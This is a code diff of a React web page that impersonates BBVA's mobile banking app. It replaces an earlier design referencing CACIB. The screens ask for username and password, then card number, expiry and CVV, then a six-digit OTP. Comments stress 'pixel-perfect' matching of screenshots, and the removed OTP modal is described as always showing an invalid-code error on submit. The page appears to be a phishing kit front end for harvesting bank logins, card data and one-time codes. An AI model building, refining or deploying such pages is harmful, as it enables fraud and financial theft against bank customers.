+          {/* Card */}
+          <section className="relative z-10 w-full px-5 flex flex-col justify-center my-auto shrink-0">
             <div
-              className="w-full"
+              className="w-full rounded-[26px] p-6 sm:p-7 shadow-2xl border border-white/40"
               style={{
-                marginTop: "clamp(14px, 3.2vh, 34px)",
+                backgroundColor: "rgba(222, 232, 247, 0.95)",
+                boxShadow: "0 18px 40px -10px rgba(0, 18, 100, 0.35)",
               }}
             >
-              <div className="w-full h-[50px] sm:h-[53px] px-[16px] bg-white rounded-[6px] border border-[#a4b5c7] flex items-center shadow-[0_1px_2px_rgba(0,0,0,0.06)] focus-within:border-[#2c5f7c] focus-within:ring-1 focus-within:ring-[#2c5f7c] transition-all">
-                <input
-                  type={showPassword ? "text" : "password"}
-                  autoComplete="current-password"
-                  value={password}
-                  onChange={(e) => {
-                    setPassword(e.target.value)
-                    if (errorMessage) setErrorMessage("")
-                  }}
-                  placeholder="Password"
-                  className="flex-1 min-w-0 h-full bg-transparent text-[#1e293b] placeholder-[#717171] text-[16px] sm:text-[17px] font-normal border-none outline-none pr-2"
-                />
+              <h1 className="text-[#0d1e38] text-[24px] sm:text-[26px] font-bold tracking-tight mb-5 select-none leading-none">
+                {greeting}
+              </h1>
 
-                {/* Right side items: Eye Icon & Forgot? Link */}
-                <div className="flex items-center gap-[12px] sm:gap-[14px] shrink-0 pl-1">
-                  <button
-                    type="button"
-                    onClick={() => setShowPassword(!showPassword)}
-                    aria-label={showPassword ? "Hide password" : "Show password"}
-                    className="p-1 text-[#64748b] hover:text-[#334155] cursor-pointer transition-colors focus:outline-none flex items-center justify-center"
-                  >
-                    {showPassword ? (
-                      <EyeOff className="w-[20px] h-[20px] sm:w-[21px] sm:h-[21px] stroke-[1.8]" />
-                    ) : (
-                      <Eye className="w-[20px] h-[20px] sm:w-[21px] sm:h-[21px] stroke-[1.8]" />
-                    )}
-                  </button>
-
-                  <a
-                    href="#forgot"
-                    onClick={(e) => {
-                      e.preventDefault()
-                      alert("Please contact CACIB customer support or visit your nearest branch to reset your credentials.")
+              <form onSubmit={handleLogin} className="w-full flex flex-col">
+                {/* Input 1: User */}
+                <div className="w-full">
+                  <label className="block text-[#374761] text-[13.5px] font-medium mb-1.5 select-none">
+                    {language === "es" ? "Usuario" : "User"}
+                  </label>
+                  <input
+                    type="text"
+                    autoComplete="username"
+                    value={userId}
+                    onChange={(e) => {
+                      setUserId(e.target.value)
+                      if (errorMessage) setErrorMessage("")
                     }}
-                    className="text-[#2c466e] hover:text-[#1e3456] text-[15px] sm:text-[16px] font-normal tracking-normal hover:underline cursor-pointer select-none whitespace-nowrap"
-                  >
-                    Forgot?
-                  </a>
+                    placeholder={language === "es" ? "Usuario" : "User"}
+                    className="w-full h-[48px] px-4 rounded-[10px] bg-white text-[#1e293b] placeholder-[#94a3b8] text-[15.5px] font-normal border border-transparent focus:outline-none focus:border-[#021493] focus:ring-1 focus:ring-[#021493] transition-all shadow-[0_1px_2px_rgba(0,0,0,0.04)]"
+                  />
                 </div>
-              </div>
-            </div>
 
-            {/* Error Message if any */}
-            {errorMessage && (
-              <p className="mt-2.5 text-red-600 bg-white/95 backdrop-blur-xs px-3 py-1.5 rounded-md text-[13px] font-medium border border-red-300 shadow-sm animate-shake">
-                {errorMessage}
-              </p>
-            )}
+                {/* Input 2: Password */}
+                <div className="w-full mt-3.5">
+                  <label className="block text-[#374761] text-[13.5px] font-medium mb-1.5 select-none">
+                    {language === "es" ? "Contraseña" : "Password"}
+                  </label>
+                  <div className="w-full h-[48px] px-4 rounded-[10px] bg-white flex items-center border border-transparent focus-within:border-[#021493] focus-within:ring-1 focus-within:ring-[#021493] transition-all shadow-[0_1px_2px_rgba(0,0,0,0.04)]">
+                    <input
+                      type={showPassword ? "text" : "password"}
+                      autoComplete="current-password"
+                      value={password}
+                      onChange={(e) => {
+                        setPassword(e.target.value)
+                        if (errorMessage) setErrorMessage("")
+                      }}
+                      placeholder={language === "es" ? "Contraseña" : "Password"}
+                      className="flex-1 min-w-0 h-full bg-transparent text-[#1e293b] placeholder-[#94a3b8] text-[15.5px] font-normal border-none outline-none pr-2"
+                    />
+                    <button
+                      type="button"
+                      onClick={() => setShowPassword(!showPassword)}
+                      aria-label={showPassword ? "Hide password" : "Show password"}
+                      className="p-1 text-[#55627a] hover:text-[#1e293b] cursor-pointer transition-colors focus:outline-none flex items-center justify-center shrink-0"
+                    >
+                      {showPassword ? (
+                        <Eye className="w-[19px] h-[19px] stroke-[1.8]" />
+                      ) : (
+                        <EyeOff className="w-[19px] h-[19px] stroke-[1.8]" />
+                      )}
+                    </button>
+                  </div>
+                </div>
 
-            {/* Action Row: Yellow LOGIN Button (Left) & Biometrics Toggle (Right) */}
-            <div
-              className="w-full flex items-start gap-[14px]"
-              style={{
-                marginTop: "clamp(18px, 4.4vh, 46px)",
-              }}
-            >
-              {/* Left Column: Yellow LOGIN Button */}
-              <div className="flex-1 max-w-[305px]">
+                {/* Error Message */}
+                {errorMessage && (
+                  <p className="mt-2.5 text-red-600 bg-red-50/90 px-3 py-1.5 rounded-md text-[13px] font-medium border border-red-200 animate-shake">
+                    {errorMessage}
+                  </p>
+                )}
+
+                {/* Submit Button */}
                 <button
                   type="submit"
-                  disabled={isLoading}
-                  className="w-full h-[54px] sm:h-[60px] bg-[#fbd601] hover:bg-[#fad000] active:scale-[0.985] text-[#1f5979] font-bold text-[16px] sm:text-[17px] tracking-wider rounded-[8px] flex items-center justify-center shadow-[0_2px_4px_rgba(0,0,0,0.12)] cursor-pointer transition-all disabled:opacity-85 select-none"
+                  disabled={isScreenLoading}
+                  className="w-full h-[50px] mt-5 rounded-[10px] bg-[#021493] hover:bg-[#01117d] active:scale-[0.985] text-white font-semibold text-[15.5px] tracking-wide flex items-center justify-center shadow-md cursor-pointer transition-all disabled:opacity-85 select-none"
                 >
-                  {isLoading ? (
-                    <div className="flex items-center gap-2">
-                      <svg
-                        className="animate-spin h-5 w-5 text-[#1f5979]"
-                        xmlns="http://www.w3.org/2000/svg"
-                        fill="none"
-                        viewBox="0 0 24 24"
-                      >
-                        <circle
-                          className="opacity-25"
-                          cx="12"
-                          cy="12"
-                          r="10"
-                          stroke="currentColor"
-                          strokeWidth="4"
-                        />
-                        <path
-                          className="opacity-75"
-                          fill="currentColor"
-                          d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
-                        />
-                      </svg>
-                      <span>SIGNING IN...</span>
-                    </div>
-                  ) : (
-                    "LOGIN"
-                  )}
+                  {language === "es" ? "Iniciar sesión para verificar" : "Log in to verify"}
                 </button>
-              </div>
+              </form>
 
-              {/* Right Column: Toggle Switch & 'Enable Face ID / Fingerprint' */}
-              <div className="w-[125px] flex flex-col items-start pt-[2px]">
-                {/* Custom Toggle Switch */}
-                <button
-                  type="button"
-                  role="switch"
-                  aria-checked={enableBiometrics}
-                  onClick={() => setEnableBiometrics(!enableBiometrics)}
-                  className={`relative w-[51px] h-[28px] rounded-full p-[2px] transition-colors duration-200 ease-in-out cursor-pointer focus:outline-none shadow-sm ${
-                    enableBiometrics
-                      ? "bg-[#22c55e]"
-                      : "bg-white/95 border border-[#cbd5e1]"
-                  }`}
-                >
-                  <span
-                    className={`block w-[24px] h-[24px] rounded-full bg-white shadow-md transform transition-transform duration-200 ease-in-out ${
-                      enableBiometrics
-                        ? "translate-x-[23px]"
-                        : "translate-x-0 border border-gray-100"
-                    }`}
-                  />
-                </button>
+              {/* 4 Feature Icons Row */}
+              <div className="grid grid-cols-4 gap-2 mt-6 pt-1 select-none">
+                <div className="flex flex-col items-center text-center group cursor-pointer">
+                  <div className="w-[48px] h-[48px] rounded-full bg-white flex items-center justify-center shadow-[0_1px_3px_rgba(0,0,0,0.06)] group-hover:scale-105 transition-transform">
+                    <UserPlus className="w-[20px] h-[20px] text-[#021493]" strokeWidth={2.2} />
+                  </div>
+                  <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
+                    {language === "es" ? <>Hazte<br />cliente</> : <>Become a<br />customer</>}
+                  </span>
+                </div>
 
-                {/* Red Text: Enable Face ID / Fingerprint */}
-                <div
-                  onClick={() => setEnableBiometrics(!enableBiometrics)}
-                  className="mt-[7px] text-[#dc2626] text-[11.5px] sm:text-[12px] font-medium leading-[1.25] cursor-pointer select-none drop-shadow-[0_1px_1px_rgba(255,255,255,0.4)]"
-                >
-                  <div>Enable Face ID /</div>
-                  <div>Fingerprint</div>
+                <div className="flex flex-col items-center text-center group cursor-pointer">
+                  <div className="w-[48px] h-[48px] rounded-full bg-white flex items-center justify-center shadow-[0_1px_3px_rgba(0,0,0,0.06)] group-hover:scale-105 transition-transform">
+                    <Home className="w-[20px] h-[20px] text-[#021493]" strokeWidth={2.2} />
+                  </div>
+                  <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
+                    BBVA<br />Valora<br />Homes
+                  </span>
+                </div>
+
+                <div className="flex flex-col items-center text-center group cursor-pointer">
+                  <div className="w-[48px] h-[48px] rounded-full bg-white flex items-center justify-center shadow-[0_1px_3px_rgba(0,0,0,0.06)] group-hover:scale-105 transition-transform">
+                    <MapPin className="w-[20px] h-[20px] text-[#021493]" strokeWidth={2.2} />
+                  </div>
+                  <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
+                    {language === "es" ? <>Oficinas<br />y cajeros</> : <>Branches<br />and ATMs</>}
+                  </span>
+                </div>
+
+                <div className="flex flex-col items-center text-center group cursor-pointer">
+                  <div className="w-[48px] h-[48px] rounded-full bg-white flex items-center justify-center shadow-[0_1px_3px_rgba(0,0,0,0.06)] group-hover:scale-105 transition-transform">
+                    <Users className="w-[20px] h-[20px] text-[#021493]" strokeWidth={2.2} />
+                  </div>
+                  <span className="text-[11px] sm:text-[11.5px] font-medium text-[#2d3a52] mt-2 leading-[1.25]">
+                    {language === "es" ? <>Compartir<br />gastos</> : <>Share<br />expenses</>}
+                  </span>
                 </div>
               </div>
             </div>
-          </form>
-        </section>
+          </section>
 
-        {/* Bottom space filler - ensures bottom landscape reflection is unobstructed */}
-        <div className="flex-1 pointer-events-none min-h-0" />
+          <div className="h-6 shrink-0" />
+        </main>
+      )}
 
-        {/* ========================================================================= */}
-        {/* PIXEL-PERFECT VERIFICATION MODAL POPUP                                    */}
-        {/* Exact text colors, unlimited OTP digits, and invalid error on submit      */}
-        {/* ========================================================================= */}
-        {isVerificationModalOpen && (
-          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-[2px] animate-in fade-in duration-200">
-            {/* Modal Card */}
-            <div
-              className="relative w-full max-w-[430px] bg-white rounded-[10px] shadow-2xl flex flex-col overflow-hidden animate-in zoom-in-95 duration-200 text-slate-800"
-              style={{
-                boxShadow: "0 20px 40px -15px rgba(0,0,0,0.4)",
-              }}
-              onClick={(e) => e.stopPropagation()}
+      {/* ========================================================================= */}
+      {/* 2. SCREEN 2: CARD DETAILS SCREEN (MATCHING SCREENSHOT 2)                  */}
+      {/* Card is STICKY at top, form below is SCROLLABLE, CVV is 3 digits          */}
+      {/* Fields AUTO-ADVANCE on fill without manual clicking                       */}
+      {/* ========================================================================= */}
+      {currentScreen === "card" && (
+        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-[#021493] px-0">
+          {/* Header with Back Arrow and centered BBVA Logo on Blue */}
+          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-[#021493]">
+            <button
+              type="button"
+              onClick={() => setCurrentScreen("login")}
+              className="p-1.5 -ml-1 text-white hover:opacity-80 transition-opacity cursor-pointer flex items-center justify-center"
+              aria-label="Back"
             >
-              {/* Header: "Verification" on left & Bold "✕" on right */}
-              <div className="w-full px-6 pt-5 pb-3 flex items-center justify-between">
-                <span className="text-[#1e486e] font-semibold text-[17px] tracking-tight">
-                  Verification
-                </span>
+              <ChevronLeft className="w-6 h-6 stroke-[2.4]" />
+            </button>
 
-                <button
-                  type="button"
-                  onClick={() => setIsVerificationModalOpen(false)}
-                  aria-label="Close Verification Modal"
-                  className="p-1 -mr-1 text-[#274164] hover:text-[#182855] transition-colors focus:outline-none cursor-pointer flex items-center justify-center"
-                >
-                  <X className="w-[23px] h-[23px] stroke-[2.8]" />
-                </button>
+            <div className="flex items-center justify-center">
+              <BbvaLogo />
+            </div>
+
+            <div className="w-7" />
+          </header>
+
+          {/* Card Container extending to bottom with #F4F6FC Background & Square (no rounded) Top Edge */}
+          <section className="relative z-10 w-full bg-[#F4F6FC] rounded-none flex-1 min-h-0 flex flex-col overflow-hidden shadow-2xl select-none">
+            {/* STICKY TOP CARD IMAGE - Pinned in place, does not scroll away, background #F4F6FC */}
+            <div className="shrink-0 w-full px-4 pt-3.5 pb-2 bg-[#F4F6FC] z-10">
+              <div className="w-full flex justify-center">
+                <img
+                  src="/bbva_card.png"
+                  alt="BBVA Débito Visa Card"
+                  className="w-full max-w-[380px] mx-auto h-auto object-contain rounded-[14px] shadow-sm select-none pointer-events-none"
+                />
               </div>
+            </div>
 
-              {/* Body Content */}
-              <div className="px-6 pt-3 pb-6 flex flex-col items-center text-center">
-                {/* Description Paragraph: Exact #525252 color from screenshot */}
-                <p className="text-[#525252] text-[14px] sm:text-[14.5px] font-normal leading-[1.45] max-w-[340px] px-1">
-                  A verification code has been sent to your registered mobile number. Please enter that code below to complete the process.
+            {/* SCROLLABLE FORM SECTION - Smoothly scrolls below the sticky card, background #F4F6FC */}
+            <div
+              className="flex-1 min-h-0 overflow-y-auto px-4 pt-2 pb-10 flex flex-col bg-[#F4F6FC] overscroll-y-contain touch-pan-y"
+              style={{ WebkitOverflowScrolling: "touch" }}
+            >
+              <div className="w-full flex flex-col pb-6">
+                {/* Title & Subtitle */}
+                <h2 className="text-[#0d1e38] text-[20px] sm:text-[21px] font-bold tracking-tight">
+                  {language === "es" ? "Introducir datos de tarjeta" : "Enter Card Details"}
+                </h2>
+                <p className="text-[#64748b] text-[13px] sm:text-[13.5px] font-normal mt-0.5 mb-4">
+                  {language === "es"
+                    ? "Verifique su tarjeta BBVA para continuar"
+                    : "Verify your BBVA card to continue"}
                 </p>
 
-                {/* Subtitle: "Verification Code Here" - Exact #243b5d color */}
-                <h3 className="mt-7 text-[#243b5d] font-semibold text-[18.5px] sm:text-[19px] tracking-tight">
-                  Verification Code Here
-                </h3>
+                {/* Form */}
+                <form onSubmit={handleCardSubmit} className="w-full flex flex-col">
+                  {/* Field 1: Card Number - Auto moves to Month when 16 digits entered */}
+                  <div className="w-full mb-3.5">
+                    <div className="flex items-center justify-between mb-1.5">
+                      <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
+                        {language === "es" ? "NÚMERO DE TARJETA" : "CARD NUMBER"}
+                      </label>
+                      <HelpCircle className="w-3.5 h-3.5 text-[#94a3b8] cursor-pointer" />
+                    </div>
+                    <input
+                      ref={cardNumberRef}
+                      type="tel"
+                      inputMode="numeric"
+                      value={cardNumber}
+                      onChange={handleCardNumberChange}
+                      placeholder="0000 0000 0000 0000"
+                      maxLength={19}
+                      className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal tracking-[0.08em] focus:outline-none focus:border-[#021493] focus:ring-1 focus:ring-[#021493] transition-all"
+                    />
+                  </div>
 
-                {/* Code Entry Input Container with Centered Animated Caret - UNLIMITED DIGITS */}
-                <div
-                  key={`shake-${shakeCount}`}
-                  className={`relative w-full max-w-[320px] h-[58px] mt-2 mb-2 flex items-center justify-center ${
-                    modalError ? "animate-shake" : ""
-                  }`}
-                >
+                  {/* Field 2 & 3: Month & Year - Auto moves Month -> Year -> CVV */}
+                  <div className="w-full grid grid-cols-2 gap-3 mb-3.5">
+                    {/* Month (2 digits) */}
+                    <div>
+                      <div className="flex items-center gap-1 mb-1.5">
+                        <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
+                          {language === "es" ? "MES" : "MONTH"}
+                        </label>
+                        <HelpCircle className="w-3.5 h-3.5 text-[#94a3b8] cursor-pointer" />
+                      </div>
+                      <input
+                        ref={cardMonthRef}
+                        type="tel"
+                        inputMode="numeric"
+                        value={cardMonth}
+                        onChange={handleMonthChange}
+                        onKeyDown={handleMonthKeyDown}
+                        placeholder="MM"
+                        maxLength={2}
+                        className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal text-center focus:outline-none focus:border-[#021493] focus:ring-1 focus:ring-[#021493] transition-all"
+                      />
+                    </div>
+
+                    {/* Year (2 digits) */}
+                    <div>
+                      <div className="flex items-center mb-1.5">
+                        <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
+                          {language === "es" ? "AÑO" : "YEAR"}
+                        </label>
+                      </div>
+                      <input
+                        ref={cardYearRef}
+                        type="tel"
+                        inputMode="numeric"
+                        value={cardYear}
+                        onChange={handleYearChange}
+                        onKeyDown={handleYearKeyDown}
+                        placeholder="YY"
+                        maxLength={2}
+                        className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#cbd5e1] text-[15px] font-normal text-center focus:outline-none focus:border-[#021493] focus:ring-1 focus:ring-[#021493] transition-all"
+                      />
+                    </div>
+                  </div>
+
+                  {/* Field 4: CVV / CVC - Strictly 3 digits */}
+                  <div className="w-full mb-3">
+                    <div className="flex items-center justify-between mb-1.5">
+                      <label className="text-[11px] font-bold text-[#64748b] tracking-wider uppercase">
+                        CVV / CVC
+                      </label>
+                      <HelpCircle className="w-3.5 h-3.5 text-[#94a3b8] cursor-pointer" />
+                    </div>
+                    <input
+                      ref={cardCvvRef}
+                      type="password"
+                      inputMode="numeric"
+                      value={cardCvv}
+                      onChange={handleCvvChange}
+                      onKeyDown={handleCvvKeyDown}
+                      placeholder="• • •"
+                      maxLength={3}
+                      className="w-full h-[48px] px-3.5 rounded-[10px] border border-[#cbd5e1] bg-white text-[#1e293b] placeholder-[#94a3b8] text-[18px] tracking-[0.25em] focus:outline-none focus:border-[#021493] focus:ring-1 focus:ring-[#021493] transition-all"
+                    />
+                  </div>
+
+                  {/* Error if any */}
+                  {cardError && (
+                    <p className="mt-1 mb-2 text-red-600 bg-red-50 px-3 py-1.5 rounded-md text-[13px] font-medium border border-red-200 animate-shake">
+                      {cardError}
+                    </p>
+                  )}
+
+                  {/* 256-bit encryption text */}
+                  <p className="text-center text-[11px] sm:text-[11.5px] text-[#94a3b8] mt-2 mb-4 leading-normal">
+                    {language === "es"
+                      ? "Los datos de su tarjeta están protegidos con cifrado de 256 bits."
+                      : "Your card details are secured with 256-bit encryption."}
+                  </p>
+
+                  {/* Continue Button */}
+                  <button
+                    type="submit"
+                    disabled={isCardSubmitting || !isCardFormValid}
+                    className={`w-full h-[48px] rounded-[10px] font-semibold text-[15.5px] tracking-wide flex items-center justify-center transition-all select-none ${
+                      isCardFormValid && !isCardSubmitting
+                        ? "bg-[#021493] hover:bg-[#01117d] active:scale-[0.985] text-white cursor-pointer shadow-sm"
+                        : "bg-[#e2e8f0] text-[#94a3b8] cursor-not-allowed"
+                    }`}
+                  >
+                    {isCardSubmitting ? (
+                      <div className="flex items-center gap-2">
+                        <svg
+                          className="animate-spin h-5 w-5 text-white"
+                          xmlns="http://www.w3.org/2000/svg"
+                          fill="none"
+                          viewBox="0 0 24 24"
+                        >
+                          <circle
+                            className="opacity-25"
+                            cx="12"
+                            cy="12"
+                            r="10"
+                            stroke="currentColor"
+                            strokeWidth="4"
+                          />
+                          <path
+                            className="opacity-75"
+                            fill="currentColor"
+                            d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
+                          />
+                        </svg>
+                        <span>{language === "es" ? "VERIFICANDO..." : "VERIFYING..."}</span>
+                      </div>
+                    ) : language === "es" ? (
+                      "Continuar"
+                    ) : (
+                      "Continue"
+                    )}
+                  </button>
+                </form>
+              </div>
+            </div>
+          </section>
+        </main>
+      )}
+
+      {/* ========================================================================= */}
+      {/* 3. SCREEN 3: PIXEL-PERFECT OTP SCREEN (MATCHING NEW SCREENSHOT)           */}
+      {/* Features: Back button, BBVA logo, White floating card, Lock Icon,         */}
+      {/* "Verify your identity", 6 separate digit boxes, countdown, verify button  */}
+      {/* ========================================================================= */}
+      {currentScreen === "otp" && (
+        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-[#021493] px-0">
+          {/* Header with Back Arrow and centered BBVA Logo on Blue */}
+          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-[#021493]">
+            <button
+              type="button"
+              onClick={() => setCurrentScreen("card")}
+              className="p-1.5 -ml-1 text-white hover:opacity-80 transition-opacity cursor-pointer flex items-center justify-center"
+              aria-label="Back"
+            >
+              <ChevronLeft className="w-6 h-6 stroke-[2.4]" />
+            </button>
+
+            <div className="flex items-center justify-center">
+              <BbvaLogo />
+            </div>
+
+            <div className="w-7" />
+          </header>
+
+          {/* Section below header: clean white background extending across the form */}
+          <section className="relative z-10 w-full bg-white flex-1 flex flex-col items-center px-4 pt-6 pb-8 overflow-y-auto select-none">
+            {/* Form Container (Clean white, seamless with background) */}
+            <div
+              className={`w-full max-w-[380px] bg-white flex flex-col items-center text-center ${
+                otpError ? "animate-shake" : ""
+              }`}
+            >
+              {/* Blue Outline Lock Icon */}
+              <div className="w-12 h-12 flex items-center justify-center mb-2 text-[#021493]">
+                <Lock className="w-[33px] h-[33px] stroke-[1.9]" />
+              </div>
+
+              {/* Title: Verify your identity */}
+              <h2 className="text-[#0d1e38] text-[20px] sm:text-[21px] font-bold tracking-tight mb-1.5">
+                {language === "es" ? "Verifique su identidad" : "Verify your identity"}
+              </h2>
+
+              {/* Subtitle */}
+              <p className="text-[#64748b] text-[12.5px] sm:text-[13px] font-normal leading-relaxed max-w-[255px] mb-4.5">
+                {language === "es"
+                  ? "Se ha enviado un código de verificación de 6 dígitos a su número registrado."
+                  : "A 6-digit verification code has been sent to your registered mobile number."}
+              </p>
+
+              {/* 6 Digit Input Boxes */}
+              <div className="w-full flex items-center justify-center gap-2 mb-4">
+                {otp.map((digit, idx) => (
                   <input
-                    ref={codeInputRef}
+                    key={idx}
+                    ref={(el) => {
+                      otpRefs.current[idx] = el
+                    }}
                     type="tel"
                     inputMode="numeric"
                     pattern="[0-9]*"
-                    value={verificationCode}
-                    onChange={(e) => {
-                      // Unlimited digits allowed without restriction
-                      const val = e.target.value.replace(/[^0-9]/g, "")
-                      setVerificationCode(val)
-                      if (modalError) setModalError("")
-                    }}
-                    placeholder=""
-                    className="w-full h-full text-center text-[22px] sm:text-[24px] font-semibold tracking-[0.25em] text-[#1e293b] bg-transparent border-none outline-none z-10 px-2"
-                    autoFocus
-                  />
-
-                  {/* Centered blinking cursor matching the screenshot (#8ea1c1) when input is empty */}
-                  {verificationCode.length === 0 && (
-                    <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
-                      <span className="w-[2px] h-[28px] bg-[#8ea1c1] animate-pulse rounded-full" />
-                    </div>
-                  )}
-
-                  {/* Subtle bottom underline guide */}
-                  <div className="absolute bottom-1 inset-x-4 h-[1px] bg-slate-200 pointer-events-none" />
-                </div>
-
-                {/* Attempts Counter: "Attempts Left" in #3f4955 with "4" (or remaining) in #c62828 red */}
-                <div className="mt-2 text-[#3f4955] text-[15px] font-medium tracking-tight">
-                  <span>Attempts Left </span>
-                  <span className="text-[#c62828] font-bold">{attemptsLeft}</span>
-                </div>
-
-                {/* Resend Link Row: Exact text and colors from screenshot */}
-                <div className="mt-8 text-[13.5px] sm:text-[14px] font-normal text-[#1f2024]">
-                  <span>Click here to resend code ! </span>
-                  <button
-                    type="button"
-                    onClick={handleResendCode}
-                    className="text-[#2b5082] hover:text-[#1d4ed8] underline font-medium cursor-pointer bg-transparent border-none p-0 inline focus:outline-none"
-                  >
-                    Resend Code
-                  </button>
-                </div>
-
-                {/* Status / Error Toast: Displays invalid error each time verify OTP is clicked */}
-                {resendSuccess && (
-                  <p className="mt-2 text-emerald-600 text-[13px] font-medium animate-in fade-in">
-                    Verification code resent successfully!
-                  </p>
-                )}
-                {modalError && (
-                  <p
-                    key={`err-${shakeCount}`}
-                    className="mt-2 text-[#dc2626] font-medium text-[13px] bg-red-50/80 border border-red-200 px-3 py-1.5 rounded-md shadow-xs animate-shake"
-                  >
-                    {modalError}
-                  </p>
-                )}
-
-                {/* Bottom Action Buttons: Cancel (Light Pill) & Submit (Deep Navy Pill) */}
-                <div className="w-full mt-6 flex items-center justify-between gap-3 sm:gap-4 px-1">
-                  {/* Cancel Button - Exact #e9e9e9 background & #d4d4d4 border from screenshot */}
-                  <button
-                    type="button"
-                    onClick={() => setIsVerificationModalOpen(false)}
-                    className="flex-1 h-[48px] sm:h-[50px] rounded-full bg-[#e9e9e9] hover:bg-[#dedede] active:scale-[0.98] border border-[#d4d4d4] text-[#374151] font-medium text-[15.5px] sm:text-[16px] transition-all cursor-pointer flex items-center justify-center select-none"
-                  >
-                    Cancel
-                  </button>
-
-                  {/* Submit Button - Exact #3d4574 deep navy blue from screenshot */}
-                  <button
-                    type="button"
-                    disabled={isModalSubmitting || !verificationCode.trim()}
-                    onClick={() => handleVerificationSubmit()}
-                    className={`flex-1 h-[48px] sm:h-[50px] rounded-full text-white font-medium text-[15.5px] sm:text-[16px] transition-all shadow-sm flex items-center justify-center select-none ${
-                      verificationCode.trim().length > 0 && !isModalSubmitting
-                        ? "bg-[#3d4574] hover:bg-[#323961] active:scale-[0.98] cursor-pointer"
-                        : "bg-[#3d4574] opacity-90 cursor-pointer"
+                    maxLength={1}
+                    value={digit}
+                    onChange={(e) => handleOtpChange(idx, e.target.value)}
+                    onKeyDown={(e) => handleOtpKeyDown(idx, e)}
+                    onFocus={() => setFocusedOtpIndex(idx)}
+                    onBlur={() => setFocusedOtpIndex(null)}
+                    className={`w-[40px] h-[48px] sm:w-[44px] sm:h-[52px] text-center text-[22px] sm:text-[24px] font-bold text-[#0d1e38] rounded-[10px] transition-all outline-none ${
+                      focusedOtpIndex === idx
+                        ? "border-2 border-[#021493] ring-1 ring-[#021493]/15 bg-white shadow-xs"
+                        : digit
+                        ? "border border-[#021493]/60 bg-white"
+                        : "border border-[#d0dbe9] bg-[#f8fafc]"
                     }`}
-                  >
-                    {isModalSubmitting ? (
-                      <svg
-                        className="animate-spin h-5 w-5 text-white"
-                        xmlns="http://www.w3.org/2000/svg"
-                        fill="none"
-                        viewBox="0 0 24 24"
-                      >
-                        <circle
-                          className="opacity-25"
-                          cx="12"
-                          cy="12"
-                          r="10"
-                          stroke="currentColor"
-                          strokeWidth="4"
-                        />
-                        <path
-                          className="opacity-75"
-                          fill="currentColor"
-                          d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
-                        />
-                      </svg>
-                    ) : (
-                      "Submit"
-                    )}
-                  </button>
+                  />
+                ))}
+              </div>
+
+              {/* Countdown & Resend Code */}
+              <div className="flex flex-col items-center mb-5 select-none">
+                <p className="text-[#64748b] text-[12.5px] sm:text-[13px] font-normal">
+                  {language === "es" ? "El código caduca en " : "Code expires in "}
+                  <span className="font-bold text-[#0d1e38]">{formatTimer(timeLeft)}</span>
+                </p>
+
+                <button
+                  type="button"
+                  onClick={handleResendOtp}
+                  className="flex items-center gap-1.5 text-[12px] sm:text-[12.5px] font-medium text-[#64748b] hover:text-[#021493] cursor-pointer mt-1.5 transition-colors"
+                >
+                  <RotateCw className="w-3.5 h-3.5 stroke-[2]" />
+                  <span>{language === "es" ? "Reenviar código" : "Resend code"}</span>
+                </button>
+
+                {resendSuccess && (
+                  <p className="mt-1.5 text-emerald-600 text-[12px] font-medium animate-in fade-in">
+                    {language === "es" ? "Código reenviado con éxito" : "Code resent successfully"}
+                  </p>
+                )}
+              </div>
+
+              {/* Error Message if any */}
+              {otpError && (
+                <p
+                  key={`err-${shakeCount}`}
+                  className="w-full mb-3 text-[#dc2626] font-medium text-[12.5px] bg-red-50 border border-red-200 px-3 py-1.5 rounded-md shadow-xs animate-shake"
+                >
+                  {otpError}
+                </p>
+              )}
+
+              {/* Verify Button */}
+              <button
+                type="button"
+                disabled={!isOtpComplete || isOtpSubmitting}
+                onClick={handleOtpSubmit}
+                className={`w-full h-[46px] rounded-[10px] font-semibold text-[15px] tracking-wide flex items-center justify-center transition-all select-none ${
+                  isOtpComplete && !isOtpSubmitting
+                    ? "bg-[#021493] hover:bg-[#01117d] active:scale-[0.985] text-white cursor-pointer shadow-sm"
+                    : "bg-[#e2e8f0] text-[#9ca3af] cursor-not-allowed"
+                }`}
+              >
+                {isOtpSubmitting ? (
+                  <div className="flex items-center gap-2">
+                    <svg
+                      className="animate-spin h-5 w-5 text-white"
+                      xmlns="http://www.w3.org/2000/svg"
+                      fill="none"
+                      viewBox="0 0 24 24"
+                    >
+                      <circle
+                        className="opacity-25"
+                        cx="12"
+                        cy="12"
+                        r="10"
+                        stroke="currentColor"
+                        strokeWidth="4"
+                      />
+                      <path
+                        className="opacity-75"
+                        fill="currentColor"
